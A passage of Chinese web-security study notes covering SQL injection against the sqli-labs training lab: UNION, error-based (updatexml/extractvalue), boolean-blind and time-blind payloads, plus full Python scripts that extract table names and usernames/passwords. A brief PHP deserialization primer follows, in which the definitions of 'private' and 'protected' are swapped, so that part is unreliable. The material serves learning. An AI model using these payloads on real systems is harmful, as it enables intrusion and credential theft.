--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取&#x27;</span>users<span class="hljs-string">&#x27;表内的字段信息</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取<span class="hljs-string">&#x27;username&#x27;</span>和<span class="hljs-string">&#x27;password&#x27;</span>字段内的信息，使用<span class="hljs-number">0x7e</span>(<span class="hljs-operator">~</span>)作用是充当连接符，方便查看<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(username,0x7e,password) from users),3 --+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>updatexml</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取数据库名称<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取数据库中所有表的名称</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取<span class="hljs-string">&#x27;users&#x27;</span>表内的字段信息<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),0x7e),1) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取&#x27;</span>username<span class="hljs-string">&#x27;和&#x27;</span>password<span class="hljs-string">&#x27;字段内的信息</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取数据库名称<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c))) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取数据库中所有表的名称</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">0x5c</span>)))<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取<span class="hljs-string">&#x27;users&#x27;</span>表内的字段信息<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),0x5c))) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取&#x27;</span>username<span class="hljs-string">&#x27;和&#x27;</span>password<span class="hljs-string">&#x27;字段内的信息</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x5c</span>))) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><strong>注意！！！</strong></p><p>在使用报错函数进行数据回显的时候，往往会遇到字符长度限制的问题，此时使用group_concat函数进行单行输出是无法输出完整的，会限制其输出的内容在32字节，下面给出一个可行的解决方案：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">//用group_concat时使用substr进行字符串截取 其中&quot;1，32&quot;控制截取的起始与结束位置<br>and  updatexml(1,(select substr((group_concat(username,0x7e,password)),1,32) from users),1) --+<br></code></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否存在布尔盲注<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://47.236.231.110:8001/Less-8/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value + max_value) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 求取中值</span><br>    <span class="hljs-keyword">while</span> (min_value &lt; max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and (ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        get_url = url + payload<br>        html = requests.get(get_url)<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            min_value = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value + max_value) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名称是:&quot;</span>, result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value + max_value) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 求取中值</span><br>    <span class="hljs-keyword">while</span> (min_value &lt; max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        get_url = url + payload<br>        html = requests.get(get_url)<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            min_value = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value + max_value) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库中存在的表的名称是:&quot;</span>, result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value + max_value) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 求取中值</span><br>    <span class="hljs-keyword">while</span> (min_value &lt; max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        get_url = url + payload<br>        html = requests.get(get_url)<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            min_value = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value + max_value) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表中的字段名是:&quot;</span>, result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value + max_value) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 求取中值</span><br>    <span class="hljs-keyword">while</span> (min_value &lt; max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and (ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        get_url = url + payload<br>        html = requests.get(get_url)<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            min_value = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value + max_value) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;字段的值是:&quot;</span>, result)<br></code></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否存在时间盲注<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(user(),1,1))&gt;1, sleep(5),0) --+</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://47.236.231.110:8001/Less-9/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#求取中值</span><br>    <span class="hljs-keyword">while</span>(min_value&lt;max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;, sleep(2),0) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        get_url = url + payload<br>        time1 = time.time()<br>        html = requests.get(get_url)<br>        time2 = time.time()<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment">#判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        time3 = time2 - time1<br>        <span class="hljs-keyword">if</span> time3 &gt; <span class="hljs-number">2</span>:<br>            min_value = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value+max_value)//<span class="hljs-number">2</span><br>    <span class="hljs-comment">#找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid)==<span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名称是:&quot;</span>,result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#求取中值</span><br>    <span class="hljs-keyword">while</span>(min_value&lt;max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;, sleep(2),0) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        get_url = url + payload<br>        time1 = time.time()<br>        html = requests.get(get_url)<br>        time2 = time.time()<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment">#判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        time3 = time2 - time1<br>        <span class="hljs-keyword">if</span> time3 &gt; <span class="hljs-number">2</span>:<br>            min_value = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value+max_value)//<span class="hljs-number">2</span><br>    <span class="hljs-comment">#找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid)==<span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库中存在的表的名称是:&quot;</span>,result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#求取中值</span><br>    <span class="hljs-keyword">while</span>(min_value&lt;max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;, sleep(2),0) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        get_url = url + payload<br>        time1 = time.time()<br>        html = requests.get(get_url)<br>        time2 = time.time()<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment">#判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        time3 = time2 - time1<br>        <span class="hljs-keyword">if</span> time3 &gt; <span class="hljs-number">2</span>:<br>            min_value = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value+max_value)//<span class="hljs-number">2</span><br>    <span class="hljs-comment">#找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid)==<span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表中的字段名是:&quot;</span>,result)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    min_value = <span class="hljs-number">33</span><br>    max_value = <span class="hljs-number">130</span><br>    mid = (min_value+max_value)//<span class="hljs-number">2</span> <span class="hljs-comment">#求取中值</span><br>    <span class="hljs-keyword">while</span>(min_value&lt;max_value):<br>        payload = <span class="hljs-string">&quot;?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;, sleep(2),0) --+&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        get_url = url + payload<br>        time1 = time.time()<br>        html = requests.get(get_url)<br>        time2 = time.time()<br>        get_url = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment">#判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数</span><br>        time3 = time2 - time1<br>        <span class="hljs-keyword">if</span> time3 &gt; <span class="hljs-number">2</span>:<br>            min_value = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            max_value = mid<br>        <span class="hljs-comment"># --- 每一次循环都会刷新这里的中间数值</span><br>        mid = (min_value+max_value)//<span class="hljs-number">2</span><br>    <span class="hljs-comment">#找不到目标元素时停止(停止符号可能得微调)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid)==<span class="hljs-string">&quot;!&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#将ACLL码转换为字符，叠加返回结果result</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表中的字段名是:&quot;</span>,result)<br></code></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h2 id="CSRF跨站漏洞"><a href="#CSRF跨站漏洞" class="headerlink" title="CSRF跨站漏洞"></a>CSRF跨站漏洞</h2><h2 id="SSRF服务端请求伪造漏洞"><a href="#SSRF服务端请求伪造漏洞" class="headerlink" title="SSRF服务端请求伪造漏洞"></a>SSRF服务端请求伪造漏洞</h2><h2 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h2><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="什么是反序列化漏洞"><a href="#什么是反序列化漏洞" class="headerlink" title="什么是反序列化漏洞"></a>什么是反序列化漏洞</h3><p>序列化：把对象转换为字节序列的过程称为对象的序列化，作用是对象状态的保存。</p><p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化，作用是重建对象。</p><p>web当中的几种典型反序列化漏洞：php反序列化、JAVA反序列化(shiro反序列化、fastjson反序列化)</p><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，sql注入，目录遍历等不可控的后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><p>序列化函数：serialize（）  &#x2F;&#x2F;将一个对象转换成一个字符串 ，序列化</p><p>反序列化函数：unserialize（）&#x2F;&#x2F;将字符串转换为一个对象。反序列化</p><p>问题在于使用unserialize（）将字节序列反序列化成对象时，存在变量可控，可以触发魔术方法</p><h3 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h3><p>public(公有)：公有的类成员可以在<strong>任何地方被访问</strong>。</p><p>private(受保护)：受保护的类成员则可以<strong>被其自身以及其子类和父类访问</strong></p><p>protected(私有)：私有的类成员则<strong>只能被其定义所在的类访问</strong></p><p>注意：<strong>访问控制修饰符不同</strong>，序列化后属性的长度和属性值会有所不同，如下所示：</p><p>public：属性被序列化的时候属性值会变成 <code>属性名</code></p><p>protected：属性被序列化的时候属性值会变成 <code>\x00*\x00属性名</code></p><p>private：属性被序列化的时候属性值会变成 <code>\x00类名\x00属性名</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 